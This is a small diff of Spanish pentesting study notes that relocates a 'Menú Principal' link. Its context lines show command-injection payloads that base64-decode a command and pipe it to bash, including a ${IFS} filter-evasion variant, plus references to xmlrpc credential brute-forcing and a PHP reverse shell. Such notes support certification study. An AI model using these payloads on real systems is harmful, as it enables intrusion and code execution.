@@ -76,7 +76,7 @@ Credenciales por fuerza bruta abusando de xmlrpc
  2. Editar si fuera necesario el ttyoverhttp, con la ruta y el nombre del fichero para decirle donde se ubica el php reverse shell
  3. Ejecutar tty_over_http.py
  ```
-<a href="https://github.com/glmbxecurity/eJPT2_eCCPT2_eWPT_Notes/tree/main"> Menú Principal</a>
+
 
  <a name="inyeccion_comandos"></a>
 ### Inyección de comandos WEB  
@@ -105,3 +105,4 @@ echo${IFS}COMMAND_BASE64|base64${IFS}-d|bash
 bash -c {echo,COMMAND_BASE64}|{base64,-d}|{bash,-i} 
 echo COMMAND_BASE64 | base64 -d | bash 
 ```
+<a href="https://github.com/glmbxecurity/eJPT2_eCCPT2_eWPT_Notes/tree/main"> Menú Principal</a>
